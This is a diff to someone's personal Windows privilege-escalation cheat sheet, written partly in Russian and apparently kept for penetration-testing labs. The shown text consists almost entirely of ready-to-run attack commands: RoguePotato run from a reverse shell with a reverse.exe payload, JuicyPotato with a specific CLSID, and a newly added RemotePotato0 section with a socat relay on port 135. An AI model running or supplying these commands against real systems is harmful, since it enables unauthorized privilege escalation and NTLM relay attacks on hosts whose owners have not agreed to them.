@@ -196,6 +196,7 @@ Now, in the "local service" reverse shell you triggered, run the RoguePotato exp
 
 C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
 
+
 # JuicyPotato (SeImpersonatePrivilege)
 
 https://github.com/ohpe/juicy-potato/releases
@@ -203,6 +204,13 @@ https://github.com/ohpe/juicy-potato/releases
 http://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter/
 
 .\JuicyPotato.exe -t * -p C:\users\userpool\desktop\start.bat -l 1338 -c '{d20a3293-3341-4ae8-9aaf-8e397cb63c34}'
+
+
+# Remoute Potato
+
+sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999  (10.10.11.231 -сервер)
+
+.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.94 -p 9999        (Запускается на сервере - можноо первым он подскажет команду socat)
 
 
 # Подсказки для виндовс
